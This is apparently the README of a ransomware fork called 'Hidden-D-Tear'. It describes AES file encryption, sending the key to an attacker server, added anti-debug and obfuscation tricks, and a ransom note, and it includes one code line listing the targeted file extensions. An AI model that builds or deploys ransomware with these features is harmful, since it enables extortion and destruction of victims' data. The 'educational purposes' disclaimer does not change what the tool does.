# *Hidden-D-Tear*
It's a ransomware-like file crypter sample which can be modified for specific purposes.
Here, I add anti-debug tricks and a bit of obfuscation (Encrypted communication with attacker platform).

## **Features**
* Uses AES algorithm to encrypt files.
* Sends encryption key to a server (Base64URL + AES Encrypted).
* Encrypted files can be decrypt in decrypter program with encryption key (Not verified).
* Creates a text file in Desktop with given message.

## **Usage**



* Target file extensions can be change. Default list:

```
var validExtensions = new[]{".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"};
```
## **Legal Warning** 

While this may be helpful for some, there are significant risks. hidden tear may be used only for Educational Purposes. Do not use it as a ransomware! You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent. I am in no way responsible for your actions.

## **Author**
Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com
Edited by R3dy(Paul Viard) / February 2025 ??? / r3dy.com
